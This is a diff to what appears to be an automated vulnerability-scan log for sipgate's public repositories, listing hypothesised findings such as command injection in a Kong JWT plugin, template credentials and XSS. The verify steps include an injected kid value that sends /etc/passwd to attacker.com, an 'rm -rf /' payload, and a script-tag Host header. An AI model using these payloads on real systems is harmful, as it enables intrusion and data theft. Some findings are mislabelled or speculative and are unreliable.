@@ -317,3 +317,71 @@ TARGET_ORG not configured for sipgate; skipping public-org deep scan.
 TARGET_ORG not configured for sipgate; skipping public-org deep scan.
 ## REPOSCAN 2026-09-09 09:22:46 UTC
 TARGET_ORG not configured for sipgate; skipping public-org deep scan.
+## REPOSCAN 2026-09-09 13:58:20 UTC
+[HYP] OS Command Injection in Kong JWT Firebase Plugin via JWT `kid` Header
+class: SSRF
+asset: sipgate/kong-plugin-jwt-firebase/kong/plugins/jwt-firebase/handler.lua:31-34
+confidence: 95
+reasoning: grab_public_key_bykid(t_kid) concatenates the JWT header `kid` value directly into a shell command: local cmd = "wget -qO - " .. google_url .. " | grep -i " .. t_kid .. magic. A crafted JWT with a malicious kid (e.g. "; rm -rf / #") would execute arbitrary OS commands via io.popen(cmd). No sanitization or escaping is performed on t_kid before shell interpolation.
+impact: CRITICAL — RCE on the Kong gateway node; attacker controls the full JWT header. Affects any Kong instance running this plugin.
+verify_steps: 1) Deploy the plugin with a Firebase project_id. 2) Send a request with a JWT containing kid: "; curl attacker.com/exfil?data=$(cat /etc/passwd) #". 3) Observe outbound request to attacker.com or command execution.
+[HYP] OS Command Injection in Kong JWT Firebase Plugin via Public Key Write
+class: SSRF
+asset: sipgate/kong-plugin-jwt-firebase/kong/plugins/jwt-firebase/handler.lua:47-50
+confidence: 90
+reasoning: push_public_key_into_file() constructs: echo -n " .. publickey .. " > " .. shm. The publickey variable originates from wget output of Google's x509 endpoint, filtered only by grep on kid. If grab_public_key_bykid returns output containing shell metacharacters (via a crafted kid that matches content in the JSON response), the echo command is vulnerable to injection. Additionally, line 48 has a typo: cmd_handlel:close() (should be cmd_handle), which causes a Lua runtime error, leaving the SHM file in an undefined state.
+impact: HIGH — Secondary injection vector; the typo also means new keys are never properly saved, degrading the plugin's security posture.
+verify_steps: 1) Trace the call path from do_authentication → grab_public_key_bykid → push_public_key_into_file. 2) Verify cmd_handlel typo causes Lua error. 3) Confirm the SHM write is never reached.
+[HYP] Hardcoded Password in Example Environment Template
+class: SECRET
+asset: sipgate/rest-api-examples/new-voicemails-nodejs/.env.dist:3
+confidence: 85
+reasoning: The .env.dist template contains PASSWORD=87654321 — a concrete numeric password value, not a placeholder like CHANGE_ME or empty string. This is distributed as part of the example code and may be used as-is by users who copy the template without modification.
+impact: LOW — Template file, not a live secret. However, users deploying this example may use the literal password for their sipgate accounts, creating credential reuse risk.
+verify_steps: 1) Check if any sipgate API accounts use 87654321. 2) Verify .env is in .gitignore. 3) Check if the example README warns users to change credentials.
+[HYP] Hardcoded MySQL Root Credentials in Default Config
+class: SECRET
+asset: sipgate/ansible-logger/ansible-callbacks/logger.py:26-27
+asset: sipgate/ansible-logger/helpers/dbprep/dbprep.py:18-19
+confidence: 80
+reasoning: Both files define configDefaults with 'user': 'root', 'password': '' — an empty root password for MySQL. While these are config defaults overridden by ansible-logger.conf, the defaults ship in the source code and may be used if the config file is missing or misconfigured.
+impact: LOW — Defaults only; requires ansible-logger.conf to be absent. But infrastructure tools with root MySQL defaults are a misconfiguration risk.
+verify_steps: 1) Check if ansible-logger.conf is included in the repo or gitignored. 2) Verify the README instructs users to set a password. 3) Confirm the web frontend (index.php) uses the same config.
+[HYP] Hardcoded HubSpot OAuth Client ID/Secret in .env.dist Template
+class: SECRET
+asset: sipgate/clinq-bridge-hubspot/.env.dist
+confidence: 70
+reasoning: The .env.dist file shows HUBSPOT_CLIENT_ID= and HUBSPOT_CLIENT_SECRET= as empty values, but the template structure confirms the app expects these credentials. The code in parse-environment.ts reads them from process.env without fallback. This is a low-risk finding as the values are empty, but the template documents the exact env vars an attacker would target.
+impact: INFO — No hardcoded secret present; values are empty placeholders. However, the env var names and required fields are exposed.
+verify_steps: 1) Confirm .env values are empty in the committed file. 2) Check if .env is in .gitignore. 3) Verify no other commit has leaked actual values.
+[HYP] XSS / Header Injection via Unsanitized $_SERVER in SugarCRM Plugin
+class: MISCONFIG
+asset: sipgate/sipgate-sugarcrm/Files/custom/modules/sipgateio/sipgateio.php:58
+asset: sipgate/sipgate-sugarcrm/Files/custom/modules/sipgateio/footer.php:21-24
+confidence: 75
+reasoning: sipgateio.php constructs a URL using $_SERVER['HTTP_HOST'] and $_SERVER['REQUEST_URI'] without sanitization: $url = 'http' . ... . '://' . "{$_SERVER['HTTP_HOST']}/{$_SERVER['REQUEST_URI']}"; This value is then echoed into XML Response attributes (onAnswer/onHangup). A crafted Host header or Request-URI containing XML metacharacters could break out of the attribute context. Similarly, footer.php uses $_SERVER values in HTML output via data-session and data-baseurl attributes without encoding.
+impact: MEDIUM — Potential reflected XSS or XML injection if the SIP gateway passes unsanitized headers through to the browser. Requires a MITM or special header injection scenario.
+verify_steps: 1) Send a request with Host: "<script>alert(1)</script>" to the SugarCRM endpoint. 2) Verify the output XML/HTML is not escaped. 3) Check if SugarCRM's output encoding mitigates this.
+[HYP] Unauthenticated Socket.io Namespace Creation with User-Controlled Token
+class: IDOR
+asset: sipgate/demo.sipgate.io/server.js:40-42,53-54
+confidence: 70
+reasoning: req.query.token is used directly as a socket.io namespace name: io.of("/" + namespace). A user can connect to any namespace by guessing/brute-forcing tokens. The /connect route generates a random namespace via Math.random(), but the /success route trusts the user-supplied token parameter. No authentication check on namespace access.
+impact: LOW — Demo app only. However, if this pattern is replicated in production code, it enables unauthorized access to real-time call event streams.
+verify_steps: 1) Hit /success?token=demo123 and connect via socket.io to /demo123. 2) Verify no auth check on the namespace connection handler. 3) Check if Math.random() namespace is predictable.
+[HYP] Insecure File Permission Guidance in Example Code
+class: MISCONFIG
+asset: sipgate/sipgate.io/examples/php/log_call-beginnings.php:13
+asset: sipgate/sipgate.io/examples/php/log_call-beginning-answer-end.php:52
+confidence: 60
+reasoning: Comments explicitly instruct: "make sure this file is writeable (e.g. create the file and chmod 777 it)". Recommending chmod 777 on a log file that receives unsanitized $_POST data (fromNumber, toNumber, direction) creates a world-writable file that could be overwritten by any local user, potentially injecting call data or causing log injection.
+impact: LOW — Example code only. But developers may copy this pattern to production.
+verify_steps: 1) Check if any production code references these examples. 2) Verify the examples have a clear "DO NOT USE IN PRODUCTION" disclaimer.
+[HYP] Potential SQL Injection via Unparameterized MySQL Query
+class: MISCONFIG
+asset: sipgate/ansible-logger/ansible-callbacks/logger.py:77
+confidence: 55
+reasoning: playbookLog() executes: cur.execute("INSERT INTO playbook_log (host_pattern, running, start) VALUES (%s,'1',NOW())", (hostPattern)). While this uses parameterized queries, the single-element tuple (hostPattern) is missing a trailing comma in Python, making it a string rather than a tuple. MySQLdb may interpret this incorrectly depending on the version. The pattern is used throughout the file correctly elsewhere (with proper tuples), but this specific instance has the Python tuple syntax error.
+impact: LOW — MySQLdb typically still parameterizes the value correctly even with a string, but the code is technically incorrect and may behave unexpectedly.
+verify_steps: 1) Test with a hostPattern containing SQL metacharacters. 2) Verify MySQLdb version handles string-vs-tuple correctly. 3) Check if the bug was fixed in later commits.
+TARGET_ORG not configured for sipgate; skipping public-org deep scan.
